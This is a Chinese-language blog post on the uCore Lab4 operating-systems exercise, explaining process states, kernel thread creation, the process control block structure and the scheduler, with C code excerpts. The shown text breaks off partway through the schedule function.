<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/26/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/26/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/19/Ucore-Lab4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/19/Ucore-Lab4/" class="post-title-link" itemprop="url">Ucore-Lab4</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-04-19 18:46:54" itemprop="dateCreated datePublished" datetime="2022-04-19T18:46:54+08:00">2022-04-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-16 23:43:02" itemprop="dateModified" datetime="2023-03-16T23:43:02+08:00">2023-03-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>16k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>15 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h2><p>进程的生命周期通常有6种情况：进程创建、进程执行、进程等待、进程抢占、进程唤醒、进程结束</p>
<p>对应了一下几种进程状态：</p>
<ul>
<li>创建状态：<ul>
<li>这是一个进程刚刚建立，但还未将它送人就绪队列时的状态 </li>
<li>指的是为程序分配合适的pcb格式，然后放入内存</li>
<li>如果由于内存不足，暂未放入主存，创建工作并未完成，进程不能被调用，则被成为创建状态</li>
</ul>
</li>
<li>就绪状态：<ul>
<li>指进程得到了除CPU以外所有必要资源就等CPU开始发动了</li>
<li>通常把处于就绪状态的进程排成一个或多个队列，称其为就绪队列</li>
</ul>
</li>
<li>执行状态：<ul>
<li>指进程已获得处理机，其程序正在执行 </li>
<li>得到调度被分配到CPU，就会从就绪状态转换为执行状态，单CPU只能执行单进程，多CPU可以进行多进程</li>
</ul>
</li>
<li>阻塞状态：<ul>
<li>进程因等待某事件（如：等待I/O操作结束、等待通信信息、等待申请缓存空间）而暂停执行时的状态</li>
<li>指执行状态受到I/O的影响变为阻塞状态，等I/O完成后又变为就绪状态</li>
<li>通常将处于阻塞状态的进程排成一个队列，称为阻塞队列，在有的系统中，按阻塞原因的不同而将处于阻塞状态的进程排成多个队列</li>
</ul>
</li>
<li>唤醒状态：<ul>
<li>唤醒进程的原因：<ul>
<li>被阻塞进程需要的资源可被满足</li>
<li>被阻塞进程等待的事件到达</li>
<li>将该进程的PCB插入到就绪队列</li>
</ul>
</li>
</ul>
</li>
<li>终止状态（僵尸状态）：<ul>
<li>当一个进程已经正常结束或异常结束，OS已将它从就绪队列中移出，但尚未将它撤消时的状态（父进程尚未使用 <code>wait</code> 函数族等来收尸，即等待父进程销毁它）</li>
<li>自然或非正常结束进程，将进入终止状态，先等待os处理，然后将其pcb清零，将pcb空间返还系统</li>
</ul>
</li>
</ul>
<h2 id="进程创建"><a href="#进程创建" class="headerlink" title="进程创建"></a>进程创建</h2><p>在Unix中，进程通过系统调用 <code>fork</code> 和 <code>exec</code> 来创建一个进程</p>
<ul>
<li><code>fork</code>：把一个进程复制成两个除PID以外完全相同的进程<ul>
<li>fork 函数创建一个继承的子进程：<ul>
<li>该子进程复制父进程的所有变量和内存，以及父进程的所有CPU寄存器（除了某个特殊寄存器，以区分是子进程还是父进程） </li>
</ul>
</li>
<li>fork 函数一次调用，返回两个值：<ul>
<li>父进程中返回子进程的PID</li>
<li>子进程中返回 0</li>
</ul>
</li>
<li>fork 函数的开销十分昂贵，其实现开销来源于：<ul>
<li>对子进程分配内存</li>
<li>复制父进程的内存和寄存器到子进程中</li>
</ul>
</li>
<li>在大多数情况下，调用 <code>fork</code> 函数后就紧接着调用 <code>exec</code> ，此时 <code>fork</code> 中的内存复制操作是无用的，因此，<code>fork</code> 函数中使用 <strong>写时复制技术</strong>（Copy on Write， COW）</li>
</ul>
</li>
<li><code>exec</code>：用新进程来重写当前进程，PID没有改变</li>
</ul>
<p><strong>空闲进程的创建</strong></p>
<p>空闲进程主要工作是完成内核中各个子系统的初始化，并最后用于调度其他进程，该进程最终会一直在 <code>cpu_idle</code> 函数中判断当前是否可调度（循环语句）</p>
<ul>
<li>简单来说，虽然这叫做“系统空闲进程”，但这其实并不是一个真正的进程</li>
<li>由于该进程是为了调度进程而创建的，所以其 <code>need_resched</code> 成员初始时为1（需要被调度）</li>
<li>空闲进程在 <code>proc_init</code> 函数中被创建</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">proc_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    list_init(&amp;proc_list);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; HASH_LIST_SIZE; i ++) &#123;</span><br><span class="line">        list_init(hash_list + i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((idleproc = alloc_proc()) == <span class="literal">NULL</span>) &#123; </span><br><span class="line">        <span class="comment">/* 分配一个物理页,作为proc_struct结构体 */</span></span><br><span class="line">        panic(<span class="string">&quot;cannot alloc idleproc.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    idleproc-&gt;pid = <span class="number">0</span>; <span class="comment">/* 将空闲进程作为第一个进程,pid为0 */</span></span><br><span class="line">    idleproc-&gt;state = PROC_RUNNABLE; <span class="comment">/* 设置该空闲进程始终可运行 */</span></span><br><span class="line">    idleproc-&gt;kstack = (<span class="keyword">uintptr_t</span>)bootstack; <span class="comment">/* 设置空闲进程的内核栈 */</span></span><br><span class="line">    idleproc-&gt;need_resched = <span class="number">1</span>; <span class="comment">/* 设置该空闲进程为可调度 */</span></span><br><span class="line">    set_proc_name(idleproc, <span class="string">&quot;idle&quot;</span>); <span class="comment">/* 设置该进程的name为&quot;idle&quot; */</span></span><br><span class="line">    nr_process ++; <span class="comment">/* 将全局线程的数目加1 */</span></span><br><span class="line"></span><br><span class="line">    current = idleproc; <span class="comment">/* 设置当前进程为idleproc */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* &lt;-------- 第一个内核进程的创建 --------&gt; */</span></span><br><span class="line">    <span class="keyword">int</span> pid = kernel_thread(init_main, <span class="string">&quot;Hello world!!&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (pid &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        panic(<span class="string">&quot;create init_main failed.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    initproc = find_proc(pid);</span><br><span class="line">    set_proc_name(initproc, <span class="string">&quot;init&quot;</span>);</span><br><span class="line"></span><br><span class="line">    assert(idleproc != <span class="literal">NULL</span> &amp;&amp; idleproc-&gt;pid == <span class="number">0</span>);</span><br><span class="line">    assert(initproc != <span class="literal">NULL</span> &amp;&amp; initproc-&gt;pid == <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>第一个内核进程的创建</strong></p>
<p>第一个内核进程是未来所有新进程的父进程或祖先进程</p>
<ul>
<li>在 <code>proc_init</code> 函数中完成创建工作</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* &lt;-------- 第一个内核进程的创建 --------&gt; */</span></span><br><span class="line"><span class="keyword">int</span> pid = kernel_thread(init_main, <span class="string">&quot;Hello world!!&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (pid &lt;= <span class="number">0</span>) &#123; <span class="comment">/* 内核进程创建失败 */</span></span><br><span class="line">    panic(<span class="string">&quot;create init_main failed.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">initproc = find_proc(pid); <span class="comment">/* 通过pid查找proc_struct,并赋值给initproc */</span></span><br><span class="line">set_proc_name(initproc, <span class="string">&quot;init&quot;</span>); <span class="comment">/* 设置该进程的name为&quot;init&quot; */</span></span><br><span class="line"></span><br><span class="line">assert(idleproc != <span class="literal">NULL</span> &amp;&amp; idleproc-&gt;pid == <span class="number">0</span>);</span><br><span class="line">assert(initproc != <span class="literal">NULL</span> &amp;&amp; initproc-&gt;pid == <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>在<code>kernel_thread</code>中<ul>
<li>程序先设置 <code>trapframe</code> 结构，最后调用 <code>do_fork</code> 函数</li>
<li>注意：该 <code>trapframe</code> 部分寄存器 <code>ebx、edx、eip</code> 被分别设置为“目标函数地址”、“参数地址”以及“kernel_thread_entry地址”</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">init_main</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123; <span class="comment">/* 打印函数 */</span></span><br><span class="line">    cprintf(<span class="string">&quot;this initproc, pid = %d, name = \&quot;%s\&quot;\n&quot;</span>, current-&gt;pid, get_proc_name(current));</span><br><span class="line">    cprintf(<span class="string">&quot;To U: \&quot;%s\&quot;.\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)arg);</span><br><span class="line">    cprintf(<span class="string">&quot;To U: \&quot;en.., Bye, Bye. :)\&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">kernel_thread</span><span class="params">(<span class="keyword">int</span> (*fn)(<span class="keyword">void</span> *), <span class="keyword">void</span> *arg, <span class="keyword">uint32_t</span> clone_flags)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// fn:某个打印函数</span></span><br><span class="line">    <span class="comment">// arg:某个字符串</span></span><br><span class="line">    <span class="comment">// clone_flags:标志位</span></span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> <span class="title">tf</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;tf, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct trapframe)); <span class="comment">/* 设置trapframe结构 */</span></span><br><span class="line">    tf.tf_cs = KERNEL_CS;</span><br><span class="line">    tf.tf_ds = tf.tf_es = tf.tf_ss = KERNEL_DS;</span><br><span class="line">    tf.tf_regs.reg_ebx = (<span class="keyword">uint32_t</span>)fn;</span><br><span class="line">    tf.tf_regs.reg_edx = (<span class="keyword">uint32_t</span>)arg;</span><br><span class="line">    tf.tf_eip = (<span class="keyword">uint32_t</span>)kernel_thread_entry;</span><br><span class="line">    <span class="keyword">return</span> do_fork(clone_flags | CLONE_VM, <span class="number">0</span>, &amp;tf); <span class="comment">/* 调用do_fork */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>do_fork</code> 就是后续实验需要实现的函数</li>
</ul>
<h2 id="进程挂起"><a href="#进程挂起" class="headerlink" title="进程挂起"></a>进程挂起</h2><p>将处于挂起状态的进程映像在磁盘上，目的是减少进程占用的内存</p>
<p>挂起状态，它既可以是我们客户主动使得进程挂起，也可以是操作系统因为某些原因使得进程挂起，总而言之引入挂起状态的原因有以下几种：</p>
<ul>
<li>用户的请求：可能是在程序运行期间发现了可疑的问题，需要暂停进程</li>
<li>父进程的请求：考察，协调，或修改子进程</li>
<li>操作系统的需要：对运行中资源的使用情况进行检查和记账</li>
<li>负载调节的需要：有一些实时的任务非常重要，需要得到充足的内存空间，这个时候我们需</li>
<li>把非实时的任务进行挂起，优先使得实时任务执行</li>
<li>定时任务：一个进程可能会周期性的执行某个任务，那么在一次执行完毕后挂起而不是阻塞，这样可以节省内存</li>
<li>安全：系统有时可能会出现故障或者某些功能受到破坏，这是就需要将系统中正在进行的进程进行挂起，当系统故障消除以后，对进程的状态进行恢复</li>
</ul>
<p>挂起（Suspend）：把一个进程从内存转到外存 </p>
<ul>
<li>等待到等待挂起：没有进程处于就绪状态或就绪进程要求更多内存资源</li>
<li>就绪到就绪挂起：当有高优先级进程处于等待状态（系统认为很快会就绪的），低优先级就绪进程会挂起，为高优先级进程提供更大的内存空间</li>
<li>运行到就绪挂起：当有高优先级等待进程因事件出现而进入就绪挂起</li>
<li>等待挂起到就绪挂起：当有等待挂起进程因相关事件出现而转换状</li>
</ul>
<p>激活（Activate）：把一个进程从外存转到内存</p>
<ul>
<li>就绪挂起到就绪：没有就绪进程或挂起就绪进程优先级高于就绪进程</li>
<li>等待挂起到等待：当一个进程释放足够内存，并有高优先级等待挂起进程</li>
</ul>
<h2 id="进程切换"><a href="#进程切换" class="headerlink" title="进程切换"></a>进程切换</h2><p><strong>过程简述</strong></p>
<ul>
<li>暂停当前进程，保存上下文，并从运行状态变成其他状态</li>
<li>调度另一个进程，恢复其上下文并从就绪状态转为运行状态</li>
</ul>
<p><strong>进程控制块</strong>（Process Control Block，PCB）</p>
<ul>
<li>进程控制块是 <strong>操作系统管理控制进程运行所用的信息集合</strong> ，操作系统用PCB来描述 <strong>进程的基本情况以及运行变化的过程</strong></li>
<li><strong>PCB是进程存在的唯一标志</strong> ，每个进程都在操作系统中有一个对应的PCB（内核为每个进程维护了对应的进程控制块PCB）</li>
<li>进程控制块可以通过某个数据结构组织起来（例如链表），同一状态进程的 PCB 连接成一个链表，多个状态对应多个不同的链表，各状态的进程形成不同的链表：就绪联链表，阻塞链表等等</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">proc_state</span> &#123;</span></span><br><span class="line">    PROC_UNINIT = <span class="number">0</span>,  <span class="comment">// 未初始化的     -- alloc_proc</span></span><br><span class="line">    PROC_SLEEPING,    <span class="comment">// 等待状态       -- try_free_pages, do_wait, do_sleep</span></span><br><span class="line">    PROC_RUNNABLE,    <span class="comment">// 就绪/运行状态  -- proc_init, wakeup_proc,</span></span><br><span class="line">    PROC_ZOMBIE,      <span class="comment">// 僵死状态       -- do_exit</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">proc_state</span> <span class="title">state</span>;</span>      <span class="comment">// 当前进程的状态</span></span><br><span class="line">    <span class="keyword">int</span> pid;                    <span class="comment">// 进程ID</span></span><br><span class="line">    <span class="keyword">int</span> runs;                   <span class="comment">// 当前进程被调度的次数</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> kstack;           <span class="comment">// 内核栈</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">bool</span> need_resched; <span class="comment">// 是否需要被调度</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">parent</span>;</span> <span class="comment">// 父进程ID</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span>       <span class="comment">// 当前进程所管理的虚拟内存页，包括其所属的页目录项PDT</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span>     <span class="comment">// 保存的进程上下文,用于进程切换</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">tf</span>;</span>       <span class="comment">// 中断帧指针,指向内核栈的某个位置(保存有中断上下文)</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> cr3;                  <span class="comment">// 页目录表的地址</span></span><br><span class="line">    <span class="keyword">uint32_t</span> flags;                 <span class="comment">// 当前进程的相关标志</span></span><br><span class="line">    <span class="keyword">char</span> name[PROC_NAME_LEN + <span class="number">1</span>];   <span class="comment">// 进程名称(可执行文件名)</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> list_link;         <span class="comment">// 进程链表 </span></span><br><span class="line">    <span class="keyword">list_entry_t</span> hash_link;         <span class="comment">// 进程哈希表 </span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>struct context context</code>：<ul>
<li>需要注意的是，与 <code>trapframe</code> 所保存的用户态上下文不同，context 保存的是线程的 <strong>当前</strong> 上下文</li>
<li>这个上下文可能是执行用户代码时的上下文，也可能是执行内核代码时的上下文</li>
</ul>
</li>
<li><code>struct trapframe* tf</code>：<ul>
<li>无论是用户程序在用户态通过系统调用进入内核态，还是线程在内核态中被创建，内核态中的线程返回用户态所加载的上下文就是 <code>struct trapframe* tf</code></li>
<li>所以当一个线程在内核态中建立，则该新线程就必须“伪造”一个 <code>trapframe</code> 来返回用户态</li>
</ul>
</li>
<li>两者关系：<ul>
<li>以 <code>kernel_thread</code> 函数为例，尽管该函数设置了 <code>proc-&gt;trapframe</code> ，但在 <code>fork</code> 函数中的 <code>copy_thread</code> 函数里，程序还会设置 <code>proc-&gt;context</code> </li>
<li>“两个上下文”看上去好像冗余，但实际上两者所分的工是不一样的</li>
<li>进程之间通过进程调度来切换控制权，当某个 <code>fork</code> 出的新进程获取到了控制流后，首当其中执行的代码是 <code>current-&gt;context-&gt;eip</code> 所指向的代码，此时新进程仍处于内核态，但实际上我们想在用户态中执行代码，所以我们需要从内核态切换回用户态，也就是中断返回，此时会遇上两个问题：<ul>
<li>新进程如何执行中断返回？：这就是 <code>proc-&gt;context.eip = (uintptr_t)forkret</code> 的用处， <code>forkret</code> 会使新进程正确的从中断处理例程中返回</li>
<li>新进程中断返回至用户代码时的上下文为？：这就是 <code>proc_struct-&gt;tf</code> 的用处，中断返回时，新进程会恢复保存的 <code>trapframe</code> 信息至各个寄存器中，然后开始执行用户代码</li>
</ul>
</li>
</ul>
</li>
<li>由于进程数量可能较大，倘若从头向后遍历查找符合某个状态的PCB，则效率会十分低下，因此使用了哈希表作为遍历所用的数据结构</li>
</ul>
<p><strong>详细流程</strong></p>
<ul>
<li>uCore中，内核的第一个进程 <code>idleproc</code>（空闲进程）会执行 <code>cpu_idle</code> 函数，并从中调用 <code>schedule</code> 函数，准备开始调度进程：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">current</span> =</span> <span class="literal">NULL</span>; <span class="comment">/* 指向当前的进程 */</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">cpu_idle</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (current-&gt;need_resched) &#123; <span class="comment">/* 是否需要被调度 */</span></span><br><span class="line">            schedule(); <span class="comment">/* 准备开始调度进程 */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>schedule</code> 函数会先清除调度标志，并从当前进程在链表中的位置开始，遍历进程控制块，直到找出处于 <strong>就绪状态</strong> 的进程：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">list_entry_t</span> proc_list; <span class="comment">/* 进程链表的起始地址 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">idleproc</span> =</span> <span class="literal">NULL</span>; <span class="comment">/* 内核的第一个进程 */</span></span><br><span class="line"><span class="comment">/* 内核的第一个进程(空闲进程):其主要工作是完成内核中各个子系统的初始化,并最后用于调度其他进程 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> le2proc(le, member)         \</span></span><br><span class="line"><span class="meta">    to_struct((le), struct proc_struct, member)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> to_struct(ptr, type, member)                               \</span></span><br><span class="line"><span class="meta">    ((type *)((char *)(ptr) - offsetof(type, member)))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">schedule</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    <span class="keyword">list_entry_t</span> *le, *last;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">next</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    local_intr_save(intr_flag); <span class="comment">/* 阻塞中断 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        current-&gt;need_resched = <span class="number">0</span>; <span class="comment">/* 清除调度标志 */</span></span><br><span class="line">        last = (current == idleproc) ? &amp;proc_list : &amp;(current-&gt;list_link);</span><br><span class="line">        <span class="comment">/* 第一次执行时:当前进程肯定是第一个进程(空闲进程) */</span></span><br><span class="line">        <span class="comment">/* 后续执行时:current可能是第一个进程(空闲进程),也可能不是 */</span></span><br><span class="line">        </span><br><span class="line">        le = last; <span class="comment">/* 初始化le为当前进程在链表中的位置 */</span></span><br><span class="line">        <span class="keyword">do</span> &#123; <span class="comment">/* 